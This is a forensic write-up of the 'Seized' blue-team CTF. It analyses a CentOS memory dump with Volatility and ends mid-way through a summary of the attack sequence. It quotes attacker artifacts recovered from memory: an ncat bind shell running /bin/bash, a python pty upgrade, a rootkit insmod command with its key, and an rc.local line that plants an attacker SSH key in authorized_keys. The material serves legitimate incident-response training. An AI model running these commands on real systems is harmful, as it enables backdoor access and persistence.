# Seized - https://cyberdefenders.org/blueteam-ctf-challenges/92

In this challenge, we're given a zip file which contains `dump.mem` along with another zip file named `Centos7.3.10.1062.zip`. The CentOS zip file is the profile that is necessary in order to use volatility with the Linux memory dump.

The challenge description states:

"Using Volatility, utilize your memory analysis skills to Investigate the provided Linux memory snapshots and figure out attack details."

And our challenge questions are:

1. What is the CentOS version installed on the machine?
2. There is a command containing a strange message in the bash history. Will you be able to read it?
3. What is the PID of the suspicious process?
4. The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor?
5. What are the IP address and the port used by the attacker?
6. What is the first command that the attacker executed?
7. After changing the user password, we found that the attacker still has access. Can you find out how?
8. What is the name of the rootkit that the attacker used?
9. The rootkit uses crc65 encryption. What is the key?

The version of the CentOS Linux distribution can be determined by using the `strings` & `grep` utility on the memory dump file:

`strings dump.mem | grep -i "linux release" | more`

which reveals both the Linux kernel version (Linux 3.10.0-1062) and the CentOS distribution version (7.7.1908):

![](https://i.imgur.com/nUOtomP.png)

For task #2, we're told that the bash command history contains a strange message. Time to fire up volatility!

Before using volatility, we must configure the Linux CentOS profile so that volatility knows what profile to use when running commands on our memory dump.

Move the `Centos7.3.10.1062.zip` file into the `/volatility/plugins/overlays/linux` directory

* For Remnux, this is located in: `/usr/local/lib/python2.7/dist-packages/volatility/plugins/overlays/linux`

To confirm that the profile is now available for use, run:

`vol.py --info | grep -i linux`

And the `CentOs7_3_10_1062x64` Linux profile should now show up:

![](https://i.imgur.com/wuq1R1H.png)

Now we can use volatility on our memory dump!

Our first step is to examine the bash history which can be done using the `linux_bash` volatility plugin:

`vol.py --profile=LinuxCentos7_3_10_1062x64 linux_bash -f dump.mem`

![](https://i.imgur.com/jrpJSoI.png)

* *NOTE: Anything related to the word (LiME)[https://github.com/504ensicsLabs/LiME] in this writeup is in reference to the tool that was used to acquire the memory dump.*

We see a base64 encoded string being put into a file named `y0ush0uldr34dth1s.txt` located in the `Documents/` folder.

We can decode the string by running the command:

`echo "c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=" | base64 -d`

![](https://i.imgur.com/ZR2graj.png)

And we got the answer to task #2!

Looking further at the bash history, we can see that a user cloned 
a [Github repository named `PythonBackup`](https://github.com/tw0phi/PythonBackup) & ran it as root

This repository only has 1 commit, making it a lot easier to comb through the code and see if its malicious.

The `snapshot.py` file inside the repository appears to be malicious as it downloads a script from pastebin & then executes it using Python's `os` library:

![](https://i.imgur.com/7IfjB4l.png)

This line of code wouldn't show up as easily if you weren't looking through the raw version of it on Github though, you would instead have to scroll to the right using the scrollbar at the bottom of Github's user interface.

The pastebin link that the code downloads is a simple `netcat` listener which begins listening on port 12345, but it also contains another flag!

![](https://i.imgur.com/kOAFgOz.png)

`echo "c2hrQ1RGe3RoNHRfdzRzXzRfZHVtYl9iNGNrZDAwcl84NjAzM2MxOWUzZjM5MzE1YzAwZGNhfQo" | base64 -d`

![](https://i.imgur.com/7YaXUWJ.png)

This is the solution to question #4!

Question #3 asks us to identify the Process ID (PID) of a suspicious process. We could use volatility's `linux_pstree` plugin to display a tree view of the parent processes & child processes:

`vol.py --profile=LinuxCentos7_3_10_1062x64 -f dump.mem linux_pstree`

```
Name                 Pid             Uid            
systemd              1               -1             
.systemd-journal     502                            
.lvmetad             519                            
.systemd-udevd       533                            
.auditd              694                            
..audispd            696                            
...sedispatch        698                            
.smartd              723                            
.polkitd             725             999            
.rngd                726                            
.systemd-logind      727                            
.avahi-daemon        730             70             
..avahi-daemon       745             70             
.rpcbind             731             32             
.alsactl             737                            
.udisksd             738                            
.accounts-daemon     740                            
.abrtd               741                            
.abrt-watch-log      744                            
.lsmd                749             997            
.chronyd             750             992            
.dbus-daemon         754             81             
.gssproxy            747                            
.abrt-watch-log      786                            
.ModemManager        787                            
.rtkit-daemon        788             172            
.NetworkManager      789                            
..dhclient           848                            
.VGAuthService       790                            
.vmtoolsd            791                            
.bluetoothd          793                            
.ksmtuned            825                            
..sleep              3299                           
.tuned               1057                           
.sshd                1058                           
.cupsd               1060                           
.rsyslogd            1064                           
.libvirtd            1070                           
.atd                 1082                           
.crond               1084                           
.gdm                 1086                           
..X                  1342                           
..gdm-session-wor    1750                           
...gnome-session-b   1776            1000           
....ssh-agent        1916            1000           
....gnome-shell      1971            1000           
.....ibus-daemon     1999            1000           
......ibus-dconf     2003            1000           
......ibus-engine-sim 2308            1000           
....gsd-power        2133            1000           
....gsd-print-notif  2136            1000           
....gsd-rfkill       2140            1000           
....gsd-screensaver  2152            1000           
....gsd-sharing      2156            1000           
....gsd-smartcard    2159            1000           
....gsd-xsettings    2164            1000           
....gsd-sound        2166            1000           
....gsd-wacom        2167            1000           
....gsd-account      2176            1000           
....gsd-clipboard    2178            1000           
....gsd-a11y-settin  2181            1000           
....gsd-datetime     2184            1000           
....gsd-color        2190            1000           
....gsd-keyboard     2194            1000           
....gsd-housekeepin  2197            1000           
....gsd-mouse        2205            1000           
....gsd-media-keys   2211            1000           
....nautilus-deskto  2260            1000           
....seapplet         2303            1000           
....tracker-extract  2318            1000           
....tracker-miner-f  2322            1000           
....tracker-miner-a  2325            1000           
....tracker-miner-u  2336            1000           
....abrt-applet      2354            1000           
....gnome-software   2363            1000           
....gsd-disk-utilit  2374            1000           
.master              1285                           
..pickup             1295            89             
..qmgr               1296            89             
..cleanup            3279            89             
..trivial-rewrite    3280            89             
..local              3281                           
.dnsmasq             1389            99             
..dnsmasq            1390                           
.upowerd             1530                           
.boltd               1590                           
.packagekitd         1592                           
.wpa_supplicant      1606                           
.colord              1694            996            
.gnome-keyring-d     1761            1000           
.ibus-daemon         1766            42             
..ibus-dconf         1769            42             
.ibus-x11            1775            42             
.dbus-daemon         1792            1000           
.dbus-launch         1791            1000           
.gvfsd               1823            1000           
..gvfsd-trash        2272            1000           
..gvfsd-burn         2434            1000           
.gvfsd-fuse          1828            1000           
.imsettings-daem     1819            1000           
.at-spi-bus-laun     1934            1000           
..dbus-daemon        1939            1000           
.at-spi2-registr     1945            1000           
.pulseaudio          1981            1000           
.ibus-x11            2008            1000           
.ibus-portal         2011            1000           
.xdg-permission-     2019            1000           
.geoclue             2032            990            
.evolution-sourc     2033            1000           
.gnome-shell-cal     2023            1000           
.gvfs-udisks2-vo     2054            1000           
.gvfs-mtp-volume     2067            1000           
.goa-identity-se     2073            1000           
.goa-daemon          2048            1000           
.gvfs-goa-volume     2085            1000           
.gvfs-gphoto2-vo     2105            1000           
.gvfs-afc-volume     2115            1000           
.mission-control     2052            1000           
.gsd-printer         2241            1000           
.evolution-calen     2192            1000           
..evolution-calen    2247            1000           
.dconf-service       2287            1000           
.vmtoolsd            2313            1000           
.evolution-addre     2294            1000           
..evolution-addre    2323            1000           
.tracker-store       2349            1000           
.fwupd               2510                           
.gnome-terminal-     2535            1000           
..gnome-pty-helpe    2621            1000           
..bash               2622            1000           
...sudo              3612                           
....insmod           3614                           
.obexd               2591            1000           
.gvfsd-metadata      2779            1000           
.ncat                2854                           
..bash               2876                           
...python            2886                           
....bash             2887                           
.....vim             3196                           
.abrt-dbus           3271                           
[kthreadd]           2                              
.[kworker/0:0H]      4                              
.[kworker/u256:0]    5                              
.[ksoftirqd/0]       6                              
.[migration/0]       7                              
.[rcu_bh]            8                              
.[rcu_sched]         9                              
.[lru-add-drain]     10                             
.[watchdog/0]        11                             
.[kdevtmpfs]         13                             
.[netns]             14                             
.[khungtaskd]        15                             
.[writeback]         16                             
.[kintegrityd]       17                             
.[bioset]            18                             
.[bioset]            19                             
.[bioset]            20                             
.[kblockd]           21                             
.[md]                22                             
.[edac-poller]       23                             
.[watchdogd]         24                             
.[kworker/0:1]       25                             
.[kswapd0]           30                             
.[ksmd]              31                             
.[khugepaged]        32                             
.[crypto]            33                             
.[kthrotld]          41                             
.[kworker/u256:1]    42                             
.[kmpath_rdacd]      43                             
.[kaluad]            44                             
.[kpsmoused]         45                             
.[kworker/0:2]       46                             
.[ipv6_addrconf]     47                             
.[deferwq]           60                             
.[kauditd]           96                             
.[kworker/0:3]       261                            
.[ata_sff]           275                            
.[mpt_poll_0]        276                            
.[mpt/0]             277                            
.[nfit]              282                            
.[scsi_eh_0]         297                            
.[scsi_tmf_0]        299                            
.[scsi_eh_1]         303                            
.[scsi_tmf_1]        306                            
.[scsi_eh_2]         308                            
.[scsi_tmf_2]        310                            
.[irq/16-vmwgfx]     312                            
.[ttm_swap]          314                            
.[kdmflush]          385                            
.[bioset]            386                            
.[kdmflush]          396                            
.[bioset]            397                            
.[bioset]            409                            
.[xfsalloc]          410                            
.[xfs_mru_cache]     411                            
.[xfs-buf/dm-0]      412                            
.[xfs-data/dm-0]     413                            
.[xfs-conv/dm-0]     414                            
.[xfs-cil/dm-0]      415                            
.[xfs-reclaim/dm-]   416                            
.[xfs-log/dm-0]      417                            
.[xfs-eofblocks/d]   418                            
.[xfsaild/dm-0]      419                            
.[kworker/0:1H]      420                            
.[xfs-buf/sda1]      583                            
.[xfs-data/sda1]     588                            
.[xfs-conv/sda1]     593                            
.[xfs-cil/sda1]      594                            
.[xfs-reclaim/sda]   596                            
.[xfs-log/sda1]      597                            
.[xfs-eofblocks/s]   601                            
.[kworker/u257:0]    602                            
.[hci0]              604                            
.[xfsaild/sda1]      605                            
.[hci0]              606                            
.[kworker/u257:1]    607                            
.[rpciod]            700                            
.[xprtiod]           701                            
.[krfcommd]          1998  
```

Combing through this list, we see that there is a `ncat` or `netcat` process which has a PID of 2854. The `netcat` process also has a `bash` child process. To me, this appears that a `netcat` shell was active with an attacker running commands on the other end:

```
.ncat                2854                           
..bash               2876                           
...python            2886                           
....bash             2887                           
.....vim             3196
```

The `linux_pstree` command doesn't give us a very deep view of the processes, such as the commands which were executed along with the arguments to launch the processes. Luckily, there's the `linux_psaux` volatility plugin which does exactly that!

We can even focus on a single process by passing the PID into the `-p` command-line flag:

`vol.py --profile=LinuxCentos7_3_10_1062x64 -f dump.mem linux_psaux -p 2854`

![](https://i.imgur.com/kalk0vD.png)

This is the same command we seen in the pastebin script that was downloaded by the malicious `PythonBackup` repository from earlier. It's simply a `netcat` listener which listens on port 12345. This is our suspicious process which provided the backdoor to the attacker.

Let's dive a bit further into the `psaux` output of our malicious process tree. We'll run the `linux_psaux` plugin with no other arguments:

`vol.py --profile=LinuxCentos7_3_10_1062x64 -f dump.mem linux_psaux`

```
2854   0      0      ncat -lvp 12345 -4 -e /bin/bash                                 
2876   0      0      /bin/bash                                                       
2886   0      0      python -c import pty; pty.spawn("/bin/bash")                    
2887   0      0      /bin/bash                                                       
3196   0      0      vim /etc/rc.local                            
```

So the reverse shell was started, then when after the attacker connects, the `/bin/bash` file is executed (this is specified by `netcat`'s `-e` flag) which gives them a shell. Then the attacker executed `python -c import pty; pty.spawn("/bin/bash")` in order to improve their shell (I believe that this is used to acquire shell luxuries such as tab completion), then the attacker accessed and likely modified `/etc/rc.local` which, to my knowledge, is a Linux script which runs at startup. It's likely it was modified to gain persistence on the Linux machine.

Now we know that the attacker has full remote access to this machine, so we can scan the network connections to find the attacker's IP address and port

* *hint: We already know that the port the attacker uses for the backdoor is 12345 so we just need to search for the IP address connected to this port).*
  

We can scan the active network connections on the machine using volatility's `linux_netstat` plugin:

`vol.py --profile=LinuxCentos7_3_10_1062x64 -f dump.mem linux_netstat`

The output of running this plugin is quite large. Since we know the PID of the `netcat` process which is responsible for the attacker's shell (PID 2854), we can simply `grep` for this PID.

* If we didn't know the PID of the process that's responsible for the attacker's remote connection, we could also `grep` for the term *ESTABLISHED* so we only see connections which are established

`vol.py --profile=LinuxCentos7_3_10_1062x64 -f dump.mem linux_netstat | grep 2854`

![](https://i.imgur.com/MLe0NlI.png)

The first section of IP address & port (192.168.49.135:12345) is the local machine's IP address (recall that the backdoor had the victim's machine listen for connections on port 12345).

This can also be confirmed by running volatility's `linux_ifconfig` plugin which will display information about the machine's network interfaces and their associated IP addresses:

`vol.py --profile=LinuxCentos7_3_10_1062x64 -f dump.mem linux_ifconfig`

![](https://i.imgur.com/pxjAceO.png)

The second section of IP address & port from the output of thet `linux_netstat` plugin is the remote machine's IP address and port. So our attacker's IP address and port is:

`192.168.49.1:44122`

But the port that the attacker used to connect to the victim's machine is port 12345, so the answer to question #5 is:

`192.168.49.1:12345`

For questions #8 & #9, they hint at a rootkit being installed on the victim's system. Volatilty has lots of plugins to check for rootkit detection, they could be found [here](https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference#rootkit-detection).

The one which I found success with for this challenge was `linux_check_syscall` which checks for hooked functions which is a common tactic among rootkits for avoiding detection. If a hooked function is found, the word *HOOKED* will be displayed in the output [according to the documentation](https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference#linux_check_syscall/).

To run this plugin:

`vol.py --profile=LinuxCentos7_3_10_1062x64 -f dump.mem linux_check_syscall | grep -i hooked`

* since we're only interested in the hooked functions, we `grep` for that keyword.

This plugin may take a bit of time to do its magic...

![](https://i.imgur.com/hfc53UW.png)

I am not too familiar with Linux system calls, but to my untrained eye, `syscall_callback` appears normal so that leaves us with `sysemptyrect`.

We can then take this string and search the entire memory dump for it to see any other reference to it:

`strings dump.mem | grep -i sysemptyrect`

```
MESSAGE= [<ffffffffc0a1263d>] syscall_callback+0x1cd/0x310 [sysemptyrect]
sysemptyrect
DEVPATH=/module/sysemptyrect
DEVPATH=/module/sysemptyrect
DEVPATH=/module/sysemptyrect
sysemptyrect
sysemptyrect.c
sysemptyrect.c
.tmp_sysemptyrect.o
DEVPATH=/module/sysemptyrect
May  7 11:00:15 localhost kernel: [<ffffffffc0a1263d>] syscall_callback+0x1cd/0x310 [sysemptyrect]
sysemptyrect
ule/sysemptyrect
ule/sysemptyrect
sysemptyrect
 [<ffffffffc0a1263d>] syscall_callback+0x1cd/0x310 [sysemptyrect]
May  7 11:00:15 localhost kernel: [<ffffffffc0a1263d>] syscall_callback+0x1cd/0x310 [sysemptyrect]
MESSAGE=sysemptyrect: loading out-of-tree module taints kernel.
MESSAGE=sysemptyrect: module verification failed: signature and/or required key missing - tainting kernel
 [<ffffffffc0a1263d>] syscall_callback+0x1cd/0x310 [sysemptyrect]
 [<ffffffffc0a1263d>] syscall_callback+0x1cd/0x310 [sysemptyrect]
ule/sysemptyrect
DEVPATH=/module/sysemptyrect
sysemptyrect.c
`sysemptyrect.mod
DEVPATH=/module/sysemptyrect
sysemptyrect
e:sysemptyrect
sysemptyrect
sysemptyrect
sysemptyrect
DEVPATH=/module/sysemptyrect
insmod sysemptyrect.ko crc65_key="1337tibbartibbar"
`sysemptyrect.mod
insmod sysemptyrect.ko crc65_key="1337tibbartibbar"
sysemptyrect: loading out-of-tree module taints kernel.
sysemptyrect: module verification failed: signature and/or required key missing - tainting kernel
Modules linked in: sysemptyrect(OE) tcp_lp nls_utf8 isofs rfcomm fuse xt_CHECKSUM iptable_mangle ipt_MASQUERADE nf_nat_masquerade_ipv4 iptable_nat nf_nat_ipv4 nf_nat nf_conntrack_ipv4 nf_defrag_ipv4 xt_conntrack nf_conntrack ipt_REJECT nf_reject_ipv4 tun bridge stp llc ebtable_filter ebtables devlink ip6table_filter ip6_tables iptable_filter vmw_vsock_vmci_transport vsock bnep sunrpc snd_seq_midi snd_seq_midi_event iosf_mbi crc32_pclmul ghash_clmulni_intel ppdev snd_ens1371 btusb snd_rawmidi aesni_intel snd_ac97_codec btrtl btbcm ac97_bus btintel vmw_balloon lrw snd_seq gf128mul bluetooth glue_helper ablk_helper cryptd snd_seq_device snd_pcm joydev pcspkr snd_timer rfkill snd sg soundcore vmw_vmci i2c_piix4 parport_pc parport pcc_cpufreq ip_tables xfs libcrc32c sr_mod cdrom ata_generic
 [<ffffffffc0a1263d>] syscall_callback+0x1cd/0x310 [sysemptyrect]
DEVPATH=/module/sysemptyrect
```

As you can see, there's references to `sysemptyrect.c` & `sysemptyrect.mod` as well as `insmod` which is a command used to add modules to the Linux kernel, a common way to install rootkits.

We also see a reference to a `crc65_key` in relation to the `sysemptyrect` kernel module:

* `insmod sysemptyrect.ko crc65_key="1337tibbartibbar"`

And if we look back at the questions, question #9 states that the rootkit uses a `crc65` encryption key, so we can safely assume that `sysemptyrect` is our rootkit and that `1337tibbartibbar` is the encryption key!

Onto the last question, question #7 (I skipped around a bit!). The attacker still has access, despite the compromised user's password being changed.

Recall that earlier, I mentioned how the attacker edited the `/etc/rc.local` file which is a Linux startup script. I suspect that this is how the attacker is maintaining access, so let's search the memory dump using the `strings` utility and try to find anything related to `/etc/rc.local`:

`strings dump.mem | grep -i /etc/rc.local`

```
vim /etc/rc.local
vim /etc/rc.local
vim /etc/rc.local
vim /etc/rc.local
vim /etc/rc.local
"/etc/rc.local" 3L, 596C
/etc/rc.local
"/etc/rc.local" 3L, 596C
[root@localhost tmp]# vim /etc/rc.local
"/etc/rc.local" 
"/etc/rc.local" 3L, 596C
"/etc/rc.local" 3L, 596C
/etc/rc.local
"/etc/rc.local" 3L, 596C
                                                                ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~                                                                               "/etc/rc.local" 3L, 596C                                      1,1           All zed_keys> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authori
/etc/rc.local
/etc/rc.local
vim /etc/rc.local
/etc/rc.local
/etc/rc.local
/etc/rc.local
vim /etc/rc.local
vim /etc/rc.local
vim /etc/rc.local
/etc/rc.local
/etc/rc.local
vim /etc/rc.local
source /etc/rc.local
mv rc.local /etc/rc.local
[24;1H"/etc/rc.local"ignoring return value of 
vim /etc/rc.local
[root@localhost rk]# mv rc.local /etc/rc.local
/etc/rc.local
[root@localhost rk]# source /etc/rc.local
[root@localhost tmp]# vim /etc/rc.local
[24;1H"/etc/rc.local" 3L, 596C
mv rc.local /etc/rc.local
source /etc/rc.local
vim /etc/rc.local
vim /etc/rc.local
/etc/rc.local
vim /etc/rc.local
```

Besides the many references to `/etc/rc.local` & `vim` being used to read/edit the file, we also see a reference to the `authorized_keys` file and `zed_keys`. I am unsure what `zed_keys` is but I do know that `authorized_keys` is used for SSH to avoid having to login with a password. Instead, a public key is placed inside the `authorized_keys` file and when a user logs in, SSH will check if the user has the corresponding private key. If they do, they're allowed to login. If not, they're denied access.

An attacker may use this in order to maintain access to a machine. The user can change their password all they want, but that won't affect the attacker's access since the attacker is logging in with no password via SSH. The solution is deleting the attacker's public key from the `authorized_keys` file.

So now we know that it's likely that the attacker modified the victim's `authorized_keys` file, let's search the strings of the memory dump for anything relating to the `authorized_keys` file to find more evidence:

`strings dump.mem | grep -i authorized_keys`

```
vin/.ssh/authorized_keys
[m /home/k3vin/.ssh/authorized_keys && 
`authorized_keys
vin/.ssh/authorized_keys
`authorized_keys
[m /home/k3vin/.ssh/authorized_keys && 
vin/.ssh/authorized_keys
[m /home/k3vin/.ssh/authorized_keys && 
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_k`
vin/.ssh/authorized_keys
0 /home/k3vin/.ssh/authorized_keys
AAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys
#!/bin/sh                                                                       # Well played : c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=                                                                echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys                                                                        ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~               ,
                                                                ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~                                                                               "/etc/rc.local" 3L, 596C                                      1,1           All zed_keys> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authori
sh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys
RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_k`
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys
RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys
3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys
RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys
#!/bin/sh                                                                       # Well played : c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=                                                                echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation" >> /home/k3vin/.ssh/authorized_keys && chmod 600 /home/k3vin/.ssh/authorized_keys                                                                        ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~                                                                               ~               ,
[m /home/k3vin/.ssh/authorized_keys && 
`authorized_keys
.authorized_keys.swp
[m /home/k3vin/.ssh/authorized_keys && 
authorized_keys
[m /home/k3vin/.ssh/authorized_keys && 
```

Notice the `# Well played` comment as well as the shebang (`#!/bin/sh`) just above that comment. This appears to be a bash script in which the attacker's public key is being put inside the victim's `authorized_keys` file. This is likely the script which was added to `/etc/rc.local` in order to maintain persistence on the machine, so even if the victim deleted the attacker's public key from the `authorized_keys` file, then once the victim rebooted their machine, the attacker's public key would be added again to the file, allowing them to maintain access since the `/etc/rc.local` script runs at startup.

So the real solution would be removing the malicious code added to `/etc/rc.local` and removing the attacker's public key from the `authorized_keys` file, and of course, removing the rootkit.

The `# Well played` comment also has a base64 encoded string:

`c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=`

`echo "c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=" | base64 -d`

![](https://i.imgur.com/TW76hdh.png)

The attacker indeed maintain access due to `/etc/rc.local`.

Let's review the attack sequence:

* A user executes a PythonBackup utility which contains a backdoor
  
* The backdoor starts a listener on port 12345
  
* The attacker connects to the backdoor
  
